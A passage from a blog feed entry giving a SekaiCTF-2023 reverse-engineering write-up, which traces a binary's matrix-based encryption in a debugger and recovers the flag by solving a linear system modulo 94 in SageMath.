class="number">88</span>]*<span class="number">12</span></span><br><span class="line">tc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    tc.append(rc(i<span class="number">-33</span>))</span><br><span class="line">print(tc)</span><br><span class="line"><span class="comment">#[16, 24, 17, 25, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59]</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/29/yYdKx8TCa64Dbor.png" alt="image-20230829234137537"></p><p>Yes, the first element in vector is 16,and we go on.</p><p><img src="https://s2.loli.net/2023/08/29/G8rNAXUd5RxMj1h.png" alt="image-20230829234308013"></p><p>The second element is 55.which is just the first element in A (in double)</p><p><img src="https://s2.loli.net/2023/08/29/26Tu1XtrLpc4jfy.png" alt="image-20230829234422865"></p><p>so this round ,the num to be add is 55*16 = 880 </p><p><img src="https://s2.loli.net/2023/08/29/KzwnlyV8LZ6tgHJ.png" alt="image-20230829234547650"></p><p>so we can know that after 16 rounds ,the answer is the line comb of <code>[16, 24, 17, 25, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59]</code> and <code>[55,81,66,68,86,67,51,34,88,43,44,70,65,51,93,54]</code>,which is 49660</p><p>So we can set break point at 0x193e to see if our guess is true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001939 call    _Z11lincomb_SSERKDv8_dRK5Mat16</span><br><span class="line">.text:000000000000193E vmovapd zmmword ptr [rsp+80h+var_40], zmm0</span><br></pre></td></tr></table></figure><p>it’s true.</p><p><img src="https://s2.loli.net/2023/08/29/g7diEhCQq8Wz5lJ.png" alt="image-20230829235122809"></p><p>but wait,we know that A occupies 2048 bytes,and each element in it occupies 8 bytes.So it has 256 elements.So it is a matrix of 16*16.Why in matmult_SSE4 it gets 32 rounds.</p><p>We can ignore it temporarily.We can abstract the element in A first and to see if every round of line comb is true</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">k = [<span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;81&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;86&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;84&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;84&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;41&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;81&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;89&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;62&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;84&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;92&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;62&#x27;</span>, <span class="string">&#x27;86&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;92&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;41&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;75&#x27;</span>]</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        tmp.append(int(k[i*<span class="number">16</span>+j]))</span><br><span class="line">    A.append(tmp)</span><br><span class="line">m = [<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">52</span>]+[<span class="number">88</span>]*<span class="number">12</span></span><br><span class="line">tc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    tc.append(rc(i<span class="number">-33</span>))</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        cnt+=A[i][j]*tc[j]</span><br><span class="line">    ans.append(cnt)</span><br><span class="line">print(ans)</span><br><span class="line"><span class="comment">#[49660, 51005, 46594, 54147, 53989, 50070, 52659, 47131, 55795, 50172, 50164, 50815, 53847, 53367, 56021, 48559]</span></span><br></pre></td></tr></table></figure><p>the round 0 is true(49660) ,but the round 1 is 49860, and the round 2 is 51005(true)</p><p><img src="https://s2.loli.net/2023/08/30/8FlHQ3PrhDmb41a.png" alt="image-20230830000708814"></p><p>It seems we get true ans in even round.Why?</p><p>It is because we translate A by 1&lt;&lt;6 =64 bytes offset (which is 8 elements),not 16 elements</p><p><img src="https://s2.loli.net/2023/08/30/o8uwOmPUCHqVhpG.png" alt="image-20230830001233694"></p><p><img src="https://s2.loli.net/2023/08/30/Oelsd3Tf6nGhKCI.png" alt="image-20230830001212087"></p><p>it doesn’t matter because you can know we store  0x80 bytes one time (which is) and we only use the first part.</p><p><img src="https://s2.loli.net/2023/08/30/pORiP7XkG3KgIfM.png" alt="image-20230830001452083"></p><h4 id="mul-sub-add"><a href="#mul-sub-add" class="headerlink" title="mul,sub,add"></a>mul,sub,add</h4><p>for the mul function,you can just read the code and will find that there are a lot of junk code.All it does is just mul two numbers and send the answer to<code>xmm0</code>. Or you can debug it without read the asm code</p><p><img src="https://s2.loli.net/2023/08/30/tyazfYsORGS1ZCl.png" alt="image-20230830001956776"></p><p>the <code>xmm1</code> is setted by <code>vmovss  xmm1, cs:dword_20A0</code>,So we can know the <code>dword_20A0</code> is a float -&gt; 0.0106382975 (which is nealy 1/94)</p><p><img src="https://s2.loli.net/2023/08/30/jONH8VBaiLuzYEn.png" alt="image-20230830002200083"></p><p>just 49660*0.0106382975=528.297852</p><p>and by code <code>vcvttss2usi eax, xmm0</code>, the float is round down to 528 and send to <code>xmm1</code></p><p><img src="https://s2.loli.net/2023/08/30/RBU4aPS7XELAQiY.png" alt="image-20230830002339306"></p><p>similarly,We set bp on the second mul and get <code>dword_20A4</code> is 94</p><p><img src="https://s2.loli.net/2023/08/30/CYGDX5oZW39VNuS.png" alt="image-20230830002507418"></p><p>As for the <code>sub</code> and <code>add</code></p><p>It’s just sub and add. If you analysis the AVX code one by one ,you will find the only useful code is the recursion.So it’s just a sub function using recursion.<code>add</code> is the same .</p><p><img src="https://s2.loli.net/2023/08/30/QFI5Xj8rsLTSYPV.png" alt="image-20230830002734307"></p><p>or you can set bp to see how it get  and how it result</p><p><img src="https://s2.loli.net/2023/08/30/NhKsG1xbUoizQTY.png" alt="image-20230830002936915"></p><p><img src="https://s2.loli.net/2023/08/30/gvTiKSBrUEFnRku.png" alt="image-20230830002952450"></p><p>(49660-49632 = 28)</p><p>so the ciphertext is 28+33=61</p><p><img src="https://s2.loli.net/2023/08/30/cDVSyRQ9YTfbeXw.png" alt="image-20230830003111611"></p><p>you can just write the enc code </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">m</span>):</span></span><br><span class="line">    tc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        tc.append(rc(i<span class="number">-33</span>))</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            cnt+= A[i][j]*tc[j]</span><br><span class="line">        c.append(cnt)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        to_add = c[i]-int(c[i]*<span class="number">0.0106382975</span>)*<span class="number">94</span>+<span class="number">33</span></span><br><span class="line">        ans.append(to_add)</span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><p>you can set bp on the compare code to see if the encrypt code we analysis is true.</p><h3 id="solve-the-problem"><a href="#solve-the-problem" class="headerlink" title="solve the problem"></a>solve the problem</h3><p>haha,It’s a long story for me to say how i solve it.I used to be a CTFer majored in crypto.And the matrix,floating-point errors reminds me of the LWE problem.</p><p>The problem in this challenge can be descrypt as</p><script type="math/tex; mode=display">A\vec{x} - [A\vec{x}*a ]*94 = \vec{b}</script><p>and a is colsed to 1/94.</p><p>I used to solve a problem ,it can descript as</p><script type="math/tex; mode=display">A\vec{x} = \vec{b}</script><p>and $A$ is a float matrix and you can’t find the inverse matrix of $A$ causing by floating point errors,The right method is to construt Lattice and using LLL</p><script type="math/tex; mode=display">\left(\begin{array}{c}    \vec{x},-1\end{array}\right)\begin{pmatrix}    A& E\\    \vec{b}&\vec{0}\end{pmatrix} \approx \left(\begin{array}{c}    \vec{e},\vec{x},0\end{array}\right)</script><p>So,I think I can rewrite the challenge to            </p><script type="math/tex; mode=display">A\vec{x} - (A\vec{x}*a -\vec{err})*94 = \vec{b}</script><p>and construct lattice to solve it.But I soon realize that the $\vec{err}$ is not small enough,may not meed the Minkowski bound .So I try my best to optimize the lattice ,but didn’t work.</p><p>you could see how stupid i was</p><p><img src="https://s2.loli.net/2023/08/30/gkp3nS8jNyOteqa.png" alt="image-20230830005305276"></p><p>After the competition, the second day,I realize that $a-[a/b]*b$ is just$ a \mod b$ </p><p>WHAT THE F**K??? I forget it and overthink it, it’s just a problem to solve $A\vec{x} = \vec{b}$ on $Zmod(94)$</p><p>all the parameter is inter.No float ,No Error</p><p>F**K!</p><p>So the exp can be write rapidly in SageMath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c = [  <span class="number">0x2F</span>, <span class="number">0x4D</span>, <span class="number">0x3D</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x63</span>, <span class="number">0x50</span>, <span class="number">0x6B</span>, </span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x52</span>, <span class="number">0x2A</span>, <span class="number">0x38</span>, <span class="number">0x73</span>, <span class="number">0x3C</span>, <span class="number">0x46</span>, <span class="number">0x23</span>, <span class="number">0x2F</span>, <span class="number">0x3D</span>, </span><br><span class="line">  <span class="number">0x5C</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x3D</span>, <span class="number">0x2A</span>, <span class="number">0x62</span>, <span class="number">0x5C</span>, <span class="number">0x29</span>, <span class="number">0x75</span>, </span><br><span class="line">  <span class="number">0x59</span>, <span class="number">0x34</span>, <span class="number">0x2D</span>, <span class="number">0x47</span>, <span class="number">0x25</span>, <span class="number">0x4F</span>, <span class="number">0x22</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x63</span>, </span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0x47</span>, <span class="number">0x69</span>, <span class="number">0x5B</span>, <span class="number">0x7D</span>, <span class="number">0x7B</span>, <span class="number">0x4A</span>, <span class="number">0x48</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0x60</span>, <span class="number">0x42</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x70</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0x00</span>]</span><br><span class="line">A = [[<span class="number">55</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">34</span>, <span class="number">88</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">70</span>, <span class="number">65</span>, <span class="number">51</span>, <span class="number">93</span>, <span class="number">54</span>], [<span class="number">73</span>, <span class="number">45</span>, <span class="number">54</span>, <span class="number">35</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">87</span>, <span class="number">46</span>, <span class="number">69</span>, <span class="number">46</span>, <span class="number">46</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">51</span>], [<span class="number">39</span>, <span class="number">50</span>, <span class="number">57</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">61</span>, <span class="number">32</span>, <span class="number">79</span>, <span class="number">48</span>, <span class="number">35</span>, <span class="number">90</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">66</span>, <span class="number">52</span>], [<span class="number">70</span>, <span class="number">55</span>, <span class="number">64</span>, <span class="number">40</span>, <span class="number">52</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">60</span>, <span class="number">74</span>, <span class="number">57</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">93</span>, <span class="number">41</span>], [<span class="number">70</span>, <span class="number">77</span>, <span class="number">58</span>, <span class="number">78</span>, <span class="number">68</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">37</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">91</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">95</span>, <span class="number">58</span>], [<span class="number">71</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">75</span>, <span class="number">48</span>, <span class="number">68</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">47</span>, <span class="number">51</span>], [<span class="number">63</span>, <span class="number">49</span>, <span class="number">74</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">65</span>, <span class="number">85</span>, <span class="number">66</span>, <span class="number">53</span>, <span class="number">85</span>, <span class="number">74</span>, <span class="number">42</span>, <span class="number">81</span>], [<span class="number">33</span>, <span class="number">46</span>, <span class="number">63</span>, <span class="number">85</span>, <span class="number">39</span>, <span class="number">80</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">62</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">70</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">61</span>], [<span class="number">67</span>, <span class="number">36</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">91</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">91</span>, <span class="number">88</span>, <span class="number">87</span>, <span class="number">46</span>, <span class="number">66</span>, <span class="number">67</span>], [<span class="number">60</span>, <span class="number">80</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">69</span>, <span class="number">45</span>, <span class="number">54</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">38</span>, <span class="number">75</span>, <span class="number">35</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">91</span>], [<span class="number">91</span>, <span class="number">74</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">76</span>, <span class="number">83</span>, <span class="number">39</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">61</span>, <span class="number">49</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">75</span>, <span class="number">52</span>], [<span class="number">87</span>, <span class="number">80</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">62</span>, <span class="number">86</span>, <span class="number">51</span>, <span class="number">49</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">69</span>, <span class="number">92</span>, <span class="number">95</span>, <span class="number">42</span>], [<span class="number">44</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">88</span>, <span class="number">79</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">70</span>, <span class="number">74</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">66</span>, <span class="number">66</span>], [<span class="number">48</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">73</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">57</span>, <span class="number">79</span>, <span class="number">58</span>, <span class="number">78</span>, <span class="number">64</span>], [<span class="number">37</span>, <span class="number">78</span>, <span class="number">75</span>, <span class="number">90</span>, <span class="number">78</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">79</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">82</span>, <span class="number">73</span>, <span class="number">52</span>, <span class="number">46</span>], [<span class="number">93</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">94</span>, <span class="number">55</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">54</span>, <span class="number">37</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">40</span>, <span class="number">75</span>]]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev_rc</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">3</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">1</span>))&amp;<span class="number">15</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">    c[i]-=<span class="number">33</span></span><br><span class="line">M = Matrix(Zmod(<span class="number">94</span>),A)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c)<span class="number">-16</span>,<span class="number">16</span>):</span><br><span class="line">    b = vector(Zmod(<span class="number">94</span>),c[i:i+<span class="number">16</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> M.solve_right(b):</span><br><span class="line">        flag +=chr(rev_rc(int(i))+<span class="number">33</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/30/vesfzUGKDiRMJuy.png" alt="image-20230830010156428"></p><p>​<br>​                </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;last weekend , I take part in the SekaiCTF-2023 and solve some easy challenges.On the last day night, I spend most of time on the challen</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="reverse" scheme="http://phot0n.com/tags/reverse/"/>
    
    <category term="writeup" scheme="http://phot0n.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
